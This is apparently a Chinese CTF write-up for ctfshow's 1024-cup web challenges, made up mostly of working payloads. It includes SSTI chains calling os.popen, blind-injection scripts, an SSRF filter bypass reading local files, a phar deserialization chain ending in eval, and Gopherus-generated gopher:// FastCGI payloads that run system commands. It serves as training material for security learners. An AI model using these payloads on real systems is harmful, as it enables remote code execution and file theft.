+++
title = "ctfshow1024杯"
slug = "ctfshow-1024-cup"
description = "刷"
date = "2025-01-15T21:58:10"
lastmod = "2025-01-15T21:58:10"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["ssrf", "ssti", "phar"]
+++

## 1024_WEB签到

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
call_user_func($_GET['f']);
```

一个函数调用，这里先看`phpinfo`

```
?f=phpinfo
```

发现在ctfshow处有自定义函数，直接调用即可得到flag

```
?f=ctfshow_1024
```

## 1024_fastapi

发包没有反应

```
[09:14:47] 200 -  974B  - /docs                                             
[09:14:55] 200 -    1KB - /openapi.json                                     
[09:14:59] 200 -  767B  - /redoc 
```

然后看到json了，把格式整理一下

```json
{
  "openapi": "3.0.2",
  "info": {
    "title": "FastAPI",
    "version": "0.1.0"
  },
  "paths": {
    "/": {
      "get": {
        "summary": "Hello",
        "operationId": "hello__get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          }
        }
      }
    },
    "/cccalccc": {
      "post": {
        "summary": "Calc",
        "description": "安全的计算器",
        "operationId": "calc_cccalccc_post",
        "requestBody": {
          "content": {
            "application/x-www-form-urlencoded": {
              "schema": {
                "$ref": "#/components/schemas/Body_calc_cccalccc_post"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {}
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    }
  },
  "components": {
    "schemas": {
      "Body_calc_cccalccc_post": {
        "title": "Body_calc_cccalccc_post",
        "required": ["q"],
        "type": "object",
        "properties": {
          "q": {
            "title": "Q",
            "type": "string"
          }
        }
      },
      "HTTPValidationError": {
        "title": "HTTPValidationError",
        "type": "object",
        "properties": {
          "detail": {
            "title": "Detail",
            "type": "array",
            "items": {
              "$ref": "#/components/schemas/ValidationError"
            }
          }
        }
      },
      "ValidationError": {
        "title": "ValidationError",
        "required": ["loc", "msg", "type"],
        "type": "object",
        "properties": {
          "loc": {
            "title": "Location",
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "msg": {
            "title": "Message",
            "type": "string"
          },
          "type": {
            "title": "Error Type",
            "type": "string"
          }
        }
      }
    }
  }
}
```

一眼就看得出来哪里是路由和参数`/cccalccc`，不过好像也有个UI但是我觉得不好使，然后慢慢测试发现是使用没有大括号的ssti，那么就好办了，慢慢看就行

```
''.__class__.__base__
''.__class__.__base__.__subclasses__()	
```

但是一直都在报500错误，后面知道原来可能之因为回显是字节无法正常处理，用str函数给包裹一下就可以了

```
str(''.__class__.__base__.__subclasses__())
```

然后找`os._wrap_close`发现是存在的当时就是不好确定位置，可以写个脚本来确定位置

```python
import requests

url = 'http://b37938c8-6c81-4468-b48b-f18c7d94516d.challenge.ctf.show/cccalccc'

for i in range(200):
	data = {'q':'str(''.__class__.__base__.__subclasses__()[%d])'%i}
	r = requests.post(url,data=data)
	if 'os._wrap_close' in r.text:
		print('i =',i,'\t',r.text)
		break
```

```
str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls /').read())

str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['__builtins__']['__imp''ort__']('o''s').__dict__['pop''en']('ls').read())
```

说实话还是挺讲究细节的，然后先看`start.sh`还有`main.py`

```
str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['__builtins__']['__imp''ort__']('o''s').__dict__['pop''en']('cat main.py').read())

flag is in /mnt/f1a9

str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['__builtins__']['__imp''ort__']('o''s').__dict__['pop''en']('cat start.sh').read())
没啥用

str(''.__class__.__base__.__subclasses__()[127].__init__.__globals__['__builtins__']['__imp''ort__']('o''s').__dict__['pop''en']('cat /mnt/f1a9').read())
```

## 1024_柏拉图

看着像是一个ssrf漏洞，但是需要些许绕过好像，双写成功绕过

```
filefile://:///var/www/html/index.php
```

```php
/*index.php*/
<?php
error_reporting(0);
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}
if(isset($_GET['url'])){
    $url = $_GET['url'];
    $bad = 'file://';
    if(preg_match('/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is', $url,$match))
		{
			die('难道我不知道你在想什么？除非绕过我？！');
    }else{
      $url=str_replace($bad,"",$url);
      curl($url);
    }
}
?>
```

看到禁用的协议好像就不是那么好ssrf了，但是phar协议什么的还行，

```php
/*upload.php*/
<?php
error_reporting(0);
if(isset($_FILES["file"])){
if (($_FILES["file"]["type"]=="image/gif")&&(substr($_FILES["file"]["name"], strrpos($_FILES["file"]["name"], '.')+1))== 'gif') {

    if (file_exists("upload/" . $_FILES["file"]["name"])){
      echo $_FILES["file"]["name"] . " 文件已经存在啦！";
    }else{
      move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" .$_FILES["file"]["name"]);
      echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];
    }
}else{
      echo "这个文件我不喜欢，我喜欢一个gif的文件";
    }
}
?>
```

```php
/*readfile.php*/
<?php
error_reporting(0);
include('class.php');
function check($filename){  
    if (preg_match("/^phar|^smtp|^dict|^zip|file|etc|root|filter|\.\.\//i",$filename)){
        die("姿势太简单啦，来一点骚的？！");
    }else{
        return 0;
    }
}
if(isset($_GET['filename'])){
    $file=$_GET['filename'];
        if(strstr($file, "flag") || check($file) || strstr($file, "php")) {
            die("这么简单的获得不可能吧？！");
        }
        echo readfile($file);
}
?>
```

```php
/*unlink.php*/
<?php
error_reporting(0);
$file=$_GET['filename'];
function check($file){  
  if (preg_match("/\.\.\//i",$file)){
      die("你想干什么？！");
  }else{
      return $file;
  }
}
if(file_exists("upload/".$file)){
      if(unlink("upload/".check($file))){
          echo "删除".$file."成功！";
      }else{
          echo "删除".$file."失败！";
      }
}else{
    echo '要删除的文件不存在！';
}
?>
```

```php
/*class.php*/
<?php
error_reporting(0);
class A {
    public $a;
    public function __construct($a)
    {
        $this->a = $a;
    }
    public function __destruct()
    {
        echo "THI IS CTFSHOW".$this->a;
    }
}
class B {
    public $b;
    public function __construct($b)
    {
        $this->b = $b;
    }
    public function __toString()
    {
        return ($this->b)();
    }
}
class C{
    public $c;
    public function __construct($c)
    {
        $this->c = $c;
    }
    public function __invoke()
    {
        return eval($this->c);
    }
}
?>
```

已经确诊是phar反序列化了，首先`readfile.php`有文件读取，其次就是一个phar协议文件头的绕过，使用`compress.zlib://` 或 `compress.bzip2://` 函数而上传的地方必须为GIF这里写个GIF头即可，pop链子比较简单

```
A::__destruct->B::__toString->C::__invoke
```

```php
<?php
class A {
    public $a;
}
class B {
    public $b;
}
class C{
    public $c;
}
@unlink("phar.phar");
$phar=new Phar("phar.phar");
$phar->startBuffering();     //开缓冲
$phar->setStub("GIF89a<?php __HALT_COMPILER();?>");
$o=new A();
$o->a=new B();
$o->a->b=new C();
$o->a->b->c="phpinfo();";
$phar->setMetadata($o);
$phar->addFromString("test.txt","test");  // 写入test.txt
$phar->stopBuffering();      //关缓冲
?>
```

然后拿到路径`upload/phar.gif`，进行触发`compress.zlib://phar://upload/phar.gif`就可以了 

## 1024_hello_world

基本正常的ssti手法都是没有回显的，学习到了新姿势，使用if语句进行回显，还要使用十六进制进行关键词的绕过

```
key={%if ""["\x5f\x5fclass\x5f\x5f"]!=1%}air{%endif%}	
# 正常，回显为sir
key={%if ""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()!=1%}air{%endif%}	
# 正常，回显为sir
```

然后类似的手法拿到可利用的类，这里爆破一下

```
key={%if ""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fbase\x5f\x5f"]["\x5f\x5fsubclasses\x5f\x5f"]()[xxxxxxxxxxxxxxxx]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")!=1%}air{%endif%}
```

本来想用bp的但是没带屏幕字就太小了，不好锁定，然后就只能写脚本了，结果脚本还没写太好，应该写两个`\`的结果就写了一个一直改

```python
import requests

url = "http://46539570-f5bc-42e5-8381-e170854acb6c.challenge.ctf.show/"

for i in range(1,200):
    payload = (
        '{%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()['
        + str(i)
        + ']["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")!=1%}air{%endif%}'
    )

    data = {"key": payload}
    r = requests.post(url, data)
    # print(data)
    if "air" in r.text:
        # print(r.text)
        print(i)

```

64就可以用了，那么我们写脚本进行盲注即可

```python
import requests
import string


strings = string.digits+string.ascii_lowercase+'-_{}'
url = "http://46539570-f5bc-42e5-8381-e170854acb6c.challenge.ctf.show/"
# poc="ls /"
poc="cat /*f*"
target=""
for i in range(0,50):
    for s in strings:
        payload = '{%if ""["\\x5f\\x5fclass\\x5f\\x5f"]["\\x5f\\x5fbase\\x5f\\x5f"]["\\x5f\\x5fsubclasses\\x5f\\x5f"]()[64]["\\x5f\\x5finit\\x5f\\x5f"]["\\x5f\\x5fglobals\\x5f\\x5f"]["\\x5f\\x5fbuiltins\\x5f\\x5f"]["\\x5f\\x5fimport\\x5f\\x5f"]("os")["\\x5f\\x5fdict\\x5f\\x5f"]["po"+"pen"]("'+ poc +'")["read"]()['+ str(i) +']=="'+ s +'"%}air{%endif%}'
        data = {"key": payload}
        r = requests.post(url, data)
        # print(data)
        if "air" in r.text:
            print(r.text)
            print(s+str(i))
            target+=s
        # else:
        #     print(r.text)

print(target)
```

这脚本是真不好写啊

## 1024_图片代理

找不到什么方向，但是看到是`nginx`，可以先看看配置文件，base64传入

```
file:///etc/nginx/conf.d/default.conf
ZmlsZTovLy9ldGMvbmdpbngvY29uZi5kL2RlZmF1bHQuY29uZg==
```

```conf
server {
    listen 80 default_server;
	listen [::]:80 default_server;
    root         /var/www/bushihtml;
    index        index.php index.html;

    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

    location / {
        try_files $uri  $uri/ /index.php?$args;
    }

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        include        fastcgi_params;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    }

    location = /404.html {
		internal;
	}

}
```

有fastcgi，直接用Gopherus打就可以了

```
baozongwi@ubuntu:~/Desktop/CTFtools/Gopherus-master$ gopherus --exploit fastcgi


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  index.php
Terminal command to run:  ls /

Your gopher link is ready to do SSRF: 

gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------
```

然后回显是文件不存在，那么我们还要找一下文件才行，但是不知道怎么找，回去查看配置文件发现目录为`/var/www/bushihtml`并且存在`index.php`

```
baozongwi@ubuntu:~/Desktop/CTFtools/Gopherus-master$ gopherus --exploit fastcgi


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/bushihtml/index.php
Terminal command to run:  ls /

Your gopher link is ready to do SSRF: 

gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%09%01%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH56%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1CSCRIPT_FILENAME/var/www/bushihtml/index.php%0D%01DOCUMENT_ROOT/%00%01%04%00%01%00%00%00%00%01%05%00%01%008%04%00%3C%3Fphp%20system%28%27ls%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

-----------Made-by-SpyD3r-----------
```

就拿到`flag`了,然后尝试写木马发现没成功
